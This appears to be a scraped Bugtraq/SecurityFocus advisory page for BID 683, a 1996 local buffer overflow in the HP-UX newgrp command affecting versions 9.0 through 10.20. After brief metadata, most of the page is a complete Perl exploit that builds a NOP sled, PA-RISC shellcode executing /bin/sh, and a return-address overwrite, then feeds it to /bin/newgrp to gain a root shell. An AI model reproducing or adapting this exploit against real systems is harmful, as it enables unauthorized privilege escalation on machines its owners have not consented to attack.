#SpeeDr00t@Black Falcon<br>#bid683<p><b><span style="font-size: 18pt;">HP-UX newgrp Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/683/info">info</a><br><a href="http://www.securityfocus.com/bid/683/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/683/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/683/solution">solution</a><br><a href="http://www.securityfocus.com/bid/683/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				683
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Dec 01 1996 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Dec 01 1996 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was found by SOD and reported to bugtraq on 1 December 1996.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					HP HP-UX 10.20 <br/>
					
				
					HP HP-UX 10.10 <br/>
					
				
					HP HP-UX 10.1 0<br/>
					
				
					HP HP-UX 10.0 <br/>
					
				
					HP HP-UX 9.10 <br/>
					
				
					HP HP-UX 9.9 <br/>
					
				
					HP HP-UX 9.8 <br/>
					
				
					HP HP-UX 9.7 <br/>
					
				
					HP HP-UX 9.6 <br/>
					
				
					HP HP-UX 9.5 <br/>
					
				
					HP HP-UX 9.4 <br/>
					
				
					HP HP-UX 9.3 <br/>
					
				
					HP HP-UX 9.1 <br/>
					
				
					HP HP-UX 9.0 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	#!/usr/bin/perl<br/><br/>use FileHandle;<br/><br/>sub h2cs {<br/>  local($stuff)=@_;<br/>  local($rv);<br/>  while($stuff !~ /^$/) {<br/>    $bob=$stuff;<br/>    $bob =~ s/^(..).*$/$1/;<br/>    $stuff =~ s/^..//;<br/>    $rv.=chr(oct("0x${bob}"));<br/>    }<br/>  return $rv;<br/>  }<br/><br/>open(PIPE,"uname -r|");<br/>chop($rev=&lt;PIPE&gt;);<br/>close(PIPE);<br/>$rev =~ s/^.*\.(.*)\..*$/$1/;<br/><br/>if ($rev eq "10") {<br/>  $offset=2074;<br/>  $prealign="";<br/>  $postalign="P";<br/>  $pcoq=h2cs("7b03A00C");<br/>  } else {<br/>  $offset=2074;<br/>  $prealign="";<br/>  $postalign="P";<br/>  $pcoq=h2cs("7b03300C");<br/>  }<br/><br/>$nop=h2cs("08210280");<br/>$code="";<br/># Oddly enough, real uid already == 0<br/># Could probably make a + + link bug out of this, too..<br/>#$code.=h2cs("34160506"); # LDI 643,r22<br/>#$code.=h2cs("96d60534"); # SUBI 666,r22,r22<br/>#$code.=h2cs("20200801"); # LDIL L%0xc0000004,r1<br/>#$code.=h2cs("e420e008"); # BLE 4(sr7,r1)<br/>#$code.=h2cs("0b5a029a"); # XOR arg0,arg0,arg0<br/>$code.=h2cs("e83f1ffd"); # BL .+8,r1<br/>$code.=h2cs("08210280"); # NOP<br/>$code.=h2cs("34020102"); # LDI 129,rp<br/>$code.=h2cs("08410402"); # SUB r1,rp,rp<br/>$code.=h2cs("60400162"); # STB r0,177(rp)<br/>$code.=h2cs("b45a0154"); # ADDI 170,rp,arg0<br/>$code.=h2cs("0b390299"); # XOR arg0,arg0,arg0<br/>$code.=h2cs("0b180298"); # XOR arg0,arg0,arg0<br/>$code.=h2cs("341604be"); # LDI 607,r22<br/>$code.=h2cs("20200801"); # LDIL L%0xc0000004,r1<br/>$code.=h2cs("e420e008"); # BLE 4(sr7,r1)<br/>$code.=h2cs("96d60534"); # SUB 666,r22,r22<br/>$code.=h2cs("deadcafe"); # Illegal instruction -- dump core if exec fails<br/>$data="/bin/sh."; # Data stuff<br/><br/>$codedata=$code.$data;<br/>$num=int(($offset-length($code)-length($data)-4)/4);<br/>$pre="$nop"x$num;<br/>$of=$prealign;<br/>$of.=$pre.$code.$data.$postalign.$pcoq;<br/>exec("/bin/newgrp","$of");
	
		<ul>
</ul>
</div>